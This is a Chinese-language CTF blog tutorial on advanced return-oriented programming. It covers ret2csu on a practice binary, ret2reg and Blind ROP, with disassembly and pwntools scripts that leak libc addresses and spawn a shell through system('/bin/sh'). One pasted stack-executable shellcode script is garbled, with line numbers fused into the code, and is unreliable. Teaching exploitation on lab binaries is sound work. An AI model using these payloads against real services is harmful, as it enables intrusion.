<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>进阶ROP | Zechariahの博客</title><meta name="author" content="Zechariah"><meta name="copyright" content="Zechariah"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="进阶ROPret2__libc_csu_init(64位ELF)利用原理在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数： lib">
<meta property="og:type" content="article">
<meta property="og:title" content="进阶ROP">
<meta property="og:url" content="https://zechariah-0703.github.io/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/index.html">
<meta property="og:site_name" content="Zechariahの博客">
<meta property="og:description" content="进阶ROPret2__libc_csu_init(64位ELF)利用原理在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数： lib">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zechariah-0703.github.io/img/fengmian.png">
<meta property="article:published_time" content="2025-02-19T13:36:41.000Z">
<meta property="article:modified_time" content="2025-03-25T17:16:17.023Z">
<meta property="article:author" content="Zechariah">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="栈">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zechariah-0703.github.io/img/fengmian.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zechariah-0703.github.io/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '进阶ROP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-03-26 01:16:17'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fengmian.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Zechariahの博客"><span class="site-name">Zechariahの博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">进阶ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-19T13:36:41.000Z" title="发表于 2025-02-19 21:36:41">2025-02-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-25T17:16:17.023Z" title="更新于 2025-03-26 01:16:17">2025-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="进阶ROP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="进阶ROP"><a href="#进阶ROP" class="headerlink" title="进阶ROP"></a><strong>进阶ROP</strong></h1><h2 id="ret2-libc-csu-init-64位ELF"><a href="#ret2-libc-csu-init-64位ELF" class="headerlink" title="ret2__libc_csu_init(64位ELF)"></a><strong>ret2__libc_csu_init(64位ELF)</strong></h2><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>在64位程序中，<strong>函数的前6个参数是通过寄存器传递的</strong>，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数：</p>
<p><code>libc_csu_init</code>利用方法：<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005C0 ; __unwind &#123;
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0
.text:0000000000400624 __libc_csu_init endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<ol>
<li>从0x000000000040061A一直到结尾，我们可以<strong>利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据</strong>。<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0
.text:0000000000400624 __libc_csu_init endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0</strong>，<strong>所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数</strong>。<em>比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址</em>。<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5 at master · ctf-wiki/ctf-challenges</a><br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128110231.png" alt="Pasted image 20250128110231"></p>
<p><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111234.png" alt="Pasted image 20250128111234"></p>
<p><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111505.png" alt="Pasted image 20250128111505"></p>
<p><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111308.png" alt="Pasted image 20250128111308"><br>ida看/cyclic测出栈偏移为<code>0x88=136</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

p &#x3D; process(&#39;.&#x2F;level5&#39;)
elf &#x3D; ELF(&#39;level5&#39;)
libc &#x3D; ELF(&#39;libc.so.6&#39;)

pop_addr &#x3D; 0x40061a
write_got &#x3D; elf.got[&#39;write&#39;]
mov_addr &#x3D; 0x400600
main_addr &#x3D; elf.symbols[&#39;main&#39;]

p.recvuntil(&#39;Hello, World\n&#39;)
playload &#x3D; &#39;A&#39;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + &#39;a&#39;*(0x8+8*6) + p64(main_addr)

p.sendline(playload)

write_start &#x3D; u64(p.recv(8))
print hex(write_start)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>payload解释：<br>首先输入136个字符使程序发生栈溢出，然后让pop_addr覆盖栈中的返回地址，使程序执行pop_addr地址处的函数，并分别将栈中的0、1、write_got函数地址、8、write_got、1分别pop到寄存器rbx、rbp、r12、r13、r14、r15中去，之后将pop函数的返回地址覆盖mov_addr的地址为，如下：<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:000000000040061A                 pop     rbx &#x2F;&#x2F;rbx-&gt; 0
.text:000000000040061B                 pop     rbp &#x2F;&#x2F;rbp-&gt; 1
.text:000000000040061C                 pop     r12 &#x2F;&#x2F;r12-&gt; write_got函数地址
.text:000000000040061E                 pop     r13 &#x2F;&#x2F;r13-&gt; 8
.text:0000000000400620                 pop     r14 &#x2F;&#x2F;r14-&gt; write_got函数地址
.text:0000000000400622                 pop     r15 &#x2F;&#x2F;r15-&gt; 1
.text:0000000000400624                 retn        &#x2F;&#x2F;覆盖为mov_addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>两个write_got函数作用:<br>再布置完寄存器后，由于有<code>call qword ptr[r12+rbx*8]</code>它调用了write函数，其参数为<code>write_got</code>函数地址，写成C语言类似于：<code>write(write_got函数地址)==printf（write_got函数地址)</code>，再使用<code>u64(p.recv(8)</code>接受数据并print出来就行了<br>之后程序转向mov_addr函数，利用mov指令布置寄存器rdx，rsi，edi<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:0000000000400600                 mov     rdx, r13 &#x2F;&#x2F;rdx&#x3D;r13&#x3D;&#x3D;8
.text:0000000000400603                 mov     rsi, r14 &#x2F;&#x2F;rsi&#x3D;&#x3D;r14&#x3D;&#x3D;write_got函数地址
.text:0000000000400606                 mov     edi, r15d
&#x2F;&#x2F;edi&#x3D;&#x3D;r15d&#x3D;&#x3D;1
.text:0000000000400609                 call    qword ptr [r12+rbx*8] &#x2F;&#x2F;call write_got函数地址
.text:000000000040060D                 add     rbx, 1 
.text:0000000000400611                 cmp     rbx, rbp &#x2F;&#x2F;rbx&#x3D;&#x3D;1,rbp&#x3D;&#x3D;1
.text:0000000000400614                 jnz     short loc_400600<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>JNZ(或JNE)(jump if not zero, or not equal)，汇编语言中的条件转移指令。结果不为零(或不相等)则转移</p>
</blockquote>
<p>这里rbx和rbp都等于1，他们相等，所以继续执行payload代码(main_addr)，而不是去执行loc_400600</p>
<blockquote>
<p>从整体上来看，我们输入了<code>&#39;A&#39;*136</code>，利用payload对寄存器布局之后又重新回到了main函数，再说说<code>&#39;a&#39;*(0x8+8*6)</code>的作用：它的作用就是为了<strong>平衡堆栈</strong><br>也就是说，当mov_addr执行完之后，按照流程仍然会执行地址400616处的函数，我们并不希望它执行到这个函数（因为他会再次pop寄存器更换我们布置好的内容），所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（<strong>栈区和代码区同属于内存区域，可以被填充</strong>），如下图所示：<br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128132334.png" alt="Pasted image 20250128132334"><br>用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容</p>
</blockquote>
<p>由此我们获得了write的真实地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">libc&#x3D;ELF(&#39;&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6)

libc_base&#x3D;write_start-libc.symbols[&#39;write&#39;]
system_addr&#x3D;libc.symbols[&#39;system&#39;]+libc_base
binsh&#x3D;next(libc.search(&#39;&#x2F;bin&#x2F;sh&#39;))+libc_base

pop_rdi_ret&#x3D;0x400623
payload&#x3D;&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)

p.send(payload)

p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当我们获得write函数的真实地址之后，就可以计算出libc文件的基址，从而可以计算出system函数<br>和/bin/sh字符串在内存中的地址，从而利用它。<br>接下来解释一下第二个payload的意思：<br><code>payload=&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</code><br>当程序重新执行到main函数时，我们利用栈溢出让返回地址被pop_rdi_ret覆盖，从而程序执行pop_rdi_ret。</p>
<blockquote>
<p>注意，当我们send payload之后，pop_rdi_ret、binsh和system_addr被送到了栈中，利用gadgets:pop rdi;ret将栈中的binsh地址送往rdi寄存器中（也就是说pop_rdi_ret的参数是地址binsh)，然后将system函数地址覆盖到ret，程序就会执行此system函数。<br><strong>当system函数执行的时候会利用到rdi里的参数</strong></p>
</blockquote>
<h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi&#x3D;edi&#x3D;r15d
    # rsi&#x3D;r14
    # rdx&#x3D;r13
    # fakeebp&#x3D;&#39;b&#39; * 8
    payload &#x3D; &#39;a&#39; * 0x80 + fakeebp
    payload +&#x3D; p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload +&#x3D; p64(csu_front_addr)
    payload +&#x3D; &#39;a&#39; * 0x38
    payload +&#x3D; p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil(&#39;Hello, World\n&#39;)
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr &#x3D; u64(sh.recv(8))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h3><p><code>pop_rdi_ret=0x400623</code><br><em>这个是怎么来的？ida里为什么没有？</em><br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140952.png" alt="Pasted image 20250128140952"></p>
<h4 id="1-ROPgadget"><a href="#1-ROPgadget" class="headerlink" title="1.ROPgadget"></a>1.ROPgadget</h4><p><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140914.png" alt="Pasted image 20250128140914"></p>
<h4 id="2-看机器码"><a href="#2-看机器码" class="headerlink" title="2.看机器码"></a>2.看机器码</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">pop rbx---------&gt;5B
pop rbp---------&gt;5D
pop r12----------&gt;41 5C
pop r13----------&gt;41 5D
pop r14----------&gt;41 5E
pop r15----------&gt;41 5F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>xxxxxxxxxx28 1from pwn import <em>2context(os=’linux’, arch=’amd64’, log_level=’debug’)3​4io = process(‘./pwn2’)5elf = ELF(‘./pwn2’)6​7vul = 0x4009E78write = 0x4009DD9​10pop_rdi = 0x4014c611pop_rsi = 0x4015e712pop_rdx = 0x44262613jmp_rsi = 0x4a331314mov_rdi_esi = 0x47a3b315​16payload  = “A”</em>0x8817payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[‘<strong>stack_prot’]) + p64(mov_rdi_esi)18payload += p64(pop_rdi) + p64(elf.sym[‘</strong>libc_stack_end’]) + p64(elf.sym[‘_dl_make_stack_executable’])19payload += p64(vul)20​21io.sendlineafter(‘welcome~\n’, payload)22​23shellcode = asm(shellcraft.sh())24payload = shellcode.ljust(0x88, “A”) + p64(jmp_rsi)25​26io.sendline(payload)27​28io.interactive()python</p>
<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>ret2reg，即返回到寄存器地址进行攻击，可以绕过地址混淆（ASLR）。<br>一般用于开启ASLR的ret2shellcode题型，在函数执行后，传入的参数在栈中传给某寄存器，然而该函数在结束前并未将该寄存器复位，就导致这个寄存器仍还保存着参数，当这个参数是shellcode时，只要程序中存在jmp/call reg代码片段时，即可通过gadget跳转至该寄存器执行shellcode。<br>该攻击方法之所以能成功，是因为函数内部实现时，溢出的缓冲区地址通常会加载到某个寄存器上，在后来的运行过程中不会修改。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
<li>查看栈溢出返回时哪个寄存器指向缓冲区空间。</li>
<li>查找对应的call 寄存器或者jmp 寄存器指令，将EIP设置为该指令地址。</li>
<li>将寄存器所指向的空间上注入shellcode（确保该空间是可以执行的，通常是栈上的）<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3></li>
<li>分析和调试汇编，查看溢出函数返回时哪个寄存器指向缓冲区地址</li>
<li>向寄存器指向的缓冲区中注入shellcode</li>
<li>查找call 该寄存器或者jmp 该寄存器指令，并将该指令地址覆盖ret<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3>在函数ret之前，将所有赋过值的寄存器全部复位，清0，以避免此类漏洞</li>
</ul>
<h2 id="brop"><a href="#brop" class="headerlink" title="brop"></a>brop</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>BROP全称为”BlindROP”</strong>，一般在我们无法获得二进制文件的情况下利用 ROP进行远程攻击某个应用程序，劫持该应用程序的控制流，<strong>我们可以不需要知道该应用程序的源代码或者任何二进制代码</strong>，该应用程序可以被现有的一些保护机制，诸如NX, ASLR, PIE, 以及stack canaries等保护，应用程序所在的服务器可以是32位系统或者64位系统，BROP这一概念在2014年由Standford的Andrea Bittau发表在Oakland 2014的论文Hacking Blind中提出。</p>
<blockquote>
<p>论文地址:<a target="_blank" rel="noopener" href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">bittau-brop.pdf</a></p>
</blockquote>
<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ol>
<li>程序必须存在一个已知的栈溢出漏洞，并且攻击者知道如何触发该漏洞；</li>
<li>应用程序在crash之后可以重新启动（复活），并且重新启动（复活）的进程不会被re-rand(虽然有ASLR的保护，但是复活的进程和之前的进程的地址随机化是一样的)，这个需求其实在现实中是存在且合理的，诸如像如今的nginx, MySQL, Apache, OpenSSH, Samba等应用均符合此类特性。</li>
</ol>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol>
<li>暴力枚举，获取栈溢出长度，如果程序开启了Canary ，顺便将canary也可以爆出来</li>
<li>寻找可以<strong>返回到程序main函数的gadget</strong>,通常被称为stop_gadget</li>
<li>利用stop_gadget寻找可利用(potentially useful)gadgets，如:pop rdi; ret</li>
<li>寻找BROP Gadget，可能需要诸如write、put等函数的系统调用</li>
<li>寻找相应的PLT地址</li>
<li>dump远程内存空间<br>拿到相应的GOT内容后，泄露出libc的内存信息，最后利用rop完成getshell</li>
</ol>
<blockquote>
